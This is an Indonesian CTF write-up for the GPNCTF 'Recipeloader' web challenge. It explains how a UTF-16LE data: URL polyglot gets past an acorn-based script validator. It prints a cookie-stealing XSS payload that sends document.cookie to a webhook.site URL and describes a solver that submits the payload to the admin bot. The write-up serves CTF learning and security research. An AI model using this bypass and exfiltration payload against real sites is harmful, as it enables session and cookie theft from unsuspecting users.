# Recipeloader

Flag:

`GPNCTF{urL_PARSING_is_h4RD_even_fOR_8rOW53R5}`

## Inti bug

Aplikasi ini kelihatan sederhana:

1. Ambil `?url=...`
2. `fetch(url).then(r => r.text())`
3. Parse hasilnya pakai `acorn`
4. Hanya izinkan program yang bentuknya persis `recipe = "..."` atau ``recipe = `...` ``
5. Kalau lolos, script yang sama dimuat lagi lewat `<script src=url>`

Masalahnya ada di asumsi bahwa hasil `fetch().text()` dan parser JavaScript di browser akan melihat byte stream yang sama. Itu salah.

Untuk URL `data:text/javascript;charset=utf-16le;base64,...`, browser akan:

- Saat `fetch().text()`: decode jadi string yang kelihatan seperti teks UTF-8 kacau dengan `\0` di sela-sela karakter.
- Saat `<script src=...>`: menjalankan kontennya sebagai JavaScript UTF-16LE yang valid.

Jadi kita bisa bikin satu byte stream yang:

- Di mata validator `acorn` terlihat seperti assignment aman ke `recipe`
- Di mata parser JavaScript browser berubah jadi payload aktif

Itu parser mismatch murni.

## Analisis awal

Ada dua file yang penting:

- `index.html`
- `admin.js`

`index.html` melakukan validasi source script seperti ini:

```js
const txt = await fetch(url).then(r => r.text());
if (!isRecipeAssignmentProgram(txt)) {
  throw new Error("invalid recipe assignment program");
}

const s = document.createElement("script");
s.src = url;
document.head.appendChild(s);
```

Di situ sudah kelihatan pola klasik: input dibaca dua kali oleh dua parser yang tidak identik.

`admin.js` lebih penting lagi:

```js
await page.goto("http://localhost:1337")
await page.evaluate(flag => document.cookie = "flag"+flag, process.env.FLAG)
await page.goto(targetUrl)
```

Bot mengunjungi app lokal, menaruh cookie flag di origin `localhost:1337`, lalu mengunjungi URL yang kita submit. Jadi target kita bukan baca DOM biasa, tapi jalankan JavaScript di origin `localhost:1337` supaya bisa baca `document.cookie`.

## Jalan buntu yang sempat dicoba

Beberapa hal sempat saya uji dan semuanya mentok:

- `javascript:` URL
  Karena `fetch()` tidak mau.
- `view-source:`
  Tidak kepakai buat `fetch()` maupun `script src`.
- Response `text/html`
  Tetap diperlakukan sebagai script, bukan HTML yang bisa mengeksekusi `<script>` di dalamnya.
- Host file publik yang mengembalikan `text/plain`
  Browser menolak execute sebagai script atau kena CORS saat dipakai buat `fetch()`.
- SRI race untuk HTTP
  Tidak kepakai karena body yang dipakai `fetch()` dan body yang dipakai `<script>` harus tetap hash-identik.

Bagian paling bikin capek justru di sini: secara ide bug-nya sudah kelihatan, tapi butuh format payload yang pas supaya validator dan parser runtime sama-sama puas.

![Pas payload ke-17 masih cuma bikin parser marah](https://i.imgflip.com/1bij.jpg)

## Temuan penting

Kalau script disajikan sebagai UTF-16LE:

- `fetch().text()` mengembalikan string dengan NUL di sela-sela karakter
- `<script src>` bisa tetap mengeksekusi byte stream itu sebagai JS valid

Masalah berikutnya: string hasil `fetch().text()` itu tetap harus lolos `acorn` sebagai:

```js
recipe = ``
```

Solusinya adalah bikin polyglot byte stream.

Saya pakai prefix HTML comment:

```text
<!--
```

Lalu setelah itu saya sambung payload UTF-16LE. Ketika byte stream yang sama dibaca dengan dua cara:

- Sebagai teks biasa untuk `fetch().text()`, bagian setelah `<!--` dibuang sebagai komentar sampai newline
- Sebagai UTF-16LE untuk parser script, byte `<!--` berubah jadi identifier Unicode yang valid, jadi tidak lagi dianggap komentar HTML

Jadi struktur finalnya:

```text
<!-- + [payload UTF-16LE] + */\nre\u0063ipe = ``
```

Validator melihat:

```js
<!-- ...komentar...
recipe = ``
```

Sementara parser JS runtime melihat sesuatu seperti:

```js
ℼⴭ=0;
(new Image).src="https://webhook.site/<token>?c="+encodeURIComponent(document.cookie);
/**/
<identifier_sampah>
```

Statement terakhir error itu tidak masalah. Exfil sudah terjadi duluan.

## Payload final

Payload aktifnya sengaja sesingkat mungkin:

```js
(new Image).src="https://webhook.site/<token>?c="+encodeURIComponent(document.cookie)
```

Kenapa pakai `Image`:

- Tidak butuh CORS
- Cukup menghasilkan GET request
- Paling minim friksi

Cookie yang dibaca bot bentuknya:

```text
flagGPNCTF{...}
```

Jadi callback yang saya tunggu cukup request ke:

```text
https://webhook.site/<token>?c=flagGPNCTF{...}
```

## Solver

Saya simpan solver di:

- [solve.py](/home/nata/ctf/GPNCTF2026/web/Recipeloader/recipeloader/solve.py)

Cara pakai:

```bash
python3 solve.py 'https://steamed-tiramisu-dusted-with-shaved-beans-itaj.gpn24.ctf.kitctf.de' 'TOKEN_WEBHOOK'
```

Yang dibutuhkan cuma token dari `webhook.site`. Solver akan:

1. Bangun `data:` URL polyglot UTF-16LE
2. Submit ke `/bot/run`
3. Poll `https://webhook.site/token/<token>/requests`
4. Ambil callback yang berisi cookie flag

## Langkah eksploitasi yang dipakai waktu solve

1. Buka homepage challenge dan baca validasi di client.
2. Baca `admin.js` dan lihat bahwa bot set cookie flag di `localhost:1337`.
3. Pastikan exploit harus jalan di origin itu, bukan sekadar reflected XSS biasa.
4. Uji berbagai skenario encoding sampai ketemu perbedaan perilaku `fetch().text()` vs `<script src>`.
5. Temukan bahwa `data:text/javascript;charset=utf-16le;base64,...` adalah jalur paling enak karena:
   - dianggap static oleh `isScriptStatic`
   - tidak kena SRI
   - bisa dipaksa pakai UTF-16LE
6. Susun polyglot dengan `<!--` supaya validator dan parser runtime membaca konten yang berbeda.
7. Pakai `(new Image).src=...` untuk exfil cookie.
8. Submit URL lokal ke `/bot/run`.
9. Poll webhook sampai request bot masuk.
10. Ambil nilai setelah prefix `flag`.

## Bukti hasil

Callback yang masuk dari bot berisi:

```text
?c=flagGPNCTF%7BurL_PARSING_is_h4RD_even_fOR_8rOW53R5%7D
```

Setelah URL-decoding dan buang prefix `flag`, didapat:

```text
GPNCTF{urL_PARSING_is_h4RD_even_fOR_8rOW53R5}
```

## Kenapa bug ini menarik

Biasanya challenge beginian kelihatan seperti “oh, paling cuma whitelist assignment string literal”. Tapi sebenarnya validasinya berdiri di atas asumsi yang rapuh:

- satu URL
- satu resource
- dua jalur parsing
- hasil dianggap identik

Padahal browser tidak bekerja seperti itu. Begitu encoding ikut bermain, validator dan runtime bisa hidup di dunia yang berbeda.

Itu yang bikin challenge ini enak: bug-nya bukan sanitizer jelek, tapi salah model mental soal bagaimana browser membaca resource.

![Pas akhirnya request bot nongol dan semuanya langsung masuk akal](https://i.imgflip.com/1bhk.jpg)
